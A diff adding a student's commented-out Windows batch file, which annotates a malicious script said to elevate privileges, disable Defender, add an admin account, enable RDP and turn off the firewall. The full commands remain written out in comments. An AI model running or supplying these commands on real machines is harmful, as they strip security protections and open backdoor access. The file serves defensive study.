@@ -1,0 +1,80 @@
+:: sample_nonfunctional_redacted.bat
+:: Non-functional, redacted sample for defensive study and reporting.
+:: Author: student-dev (Aylin)
+:: Purpose: Educational / analysis only. This file intentionally does NOT execute harmful actions.
+
+@echo off
+:: ============================================================
+:: NOTE: This file is intentionally NON-FUNCTIONAL.
+:: All commands that would change system state are commented out.
+:: It is safe to include this redacted file in documentation or GitHub.
+:: ============================================================
+
+
+:: Hi — I'm a student who analyzed an advanced Windows batch that tried to:
+::  - elevate privileges
+::  - alter Windows Defender settings
+::  - create a local admin account
+::  - enable RDP and change firewall rules
+:: I redacted the dangerous parts and left comments for study.
+
+:: -----------------------------
+:: Auto-elevation / minimized relaunch (REDACTED)
+:: -----------------------------
+:: Original idea: relaunch script with admin privileges and minimize the window.
+:: Redacted example placeholder (non-executable):
+:: :: if not defined IS_MINIMIZED ( set IS_MINIMIZED=1 & start "" /min "%~dpnx0" %* & exit )
+
+:: -----------------------------
+:: Disable Defender realtime (REDACTED)
+:: -----------------------------
+:: Dangerous command removed:
+:: :: powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
+
+:: -----------------------------
+:: Request admin privileges helper (REDACTED)
+:: -----------------------------
+:: Original created a temporary VBScript to get admin privileges:
+:: :: echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
+:: :: echo UAC.ShellExecute "cmd.exe", "/c cd ""%~sdp0"" && ""%~s0""", "", "runas", 1 >> "%temp%\getadmin.vbs"
+:: :: "%temp%\getadmin.vbs"
+:: We removed it for safety.
+
+:: -----------------------------
+:: Add new admin user (REDACTED)
+:: -----------------------------
+:: DANGEROUS - DO NOT UNCOMMENT:
+:: :: net user <REDACTED_USERNAME> <REDACTED_PASSWORD> /add
+:: :: net localgroup administrators <REDACTED_USERNAME> /add
+
+:: -----------------------------
+:: Enable Remote Desktop (REDACTED)
+:: -----------------------------
+:: DANGEROUS - DO NOT UNCOMMENT:
+:: :: reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+:: :: netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
+
+:: -----------------------------
+:: Disable Windows Defender via registry (REDACTED)
+:: -----------------------------
+:: DANGEROUS - DO NOT UNCOMMENT:
+:: :: reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
+:: :: reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
+:: :: sc stop WinDefend
+:: :: sc config WinDefend start= disabled
+
+:: -----------------------------
+:: Fully disable Windows Firewall (REDACTED)
+:: -----------------------------
+:: DANGEROUS - DO NOT UNCOMMENT:
+:: :: netsh advfirewall set allprofiles state off
+
+:: -----------------------------
+:: Clean up & safe message
+:: -----------------------------
+echo ===============================================
+echo REDACTED SAMPLE (SAFE) - educational only
+echo All potentially harmful commands are commented out.
+echo If you need to study the original behavior, do it in an isolated lab with supervisor approval.
+echo ===============================================
+pause
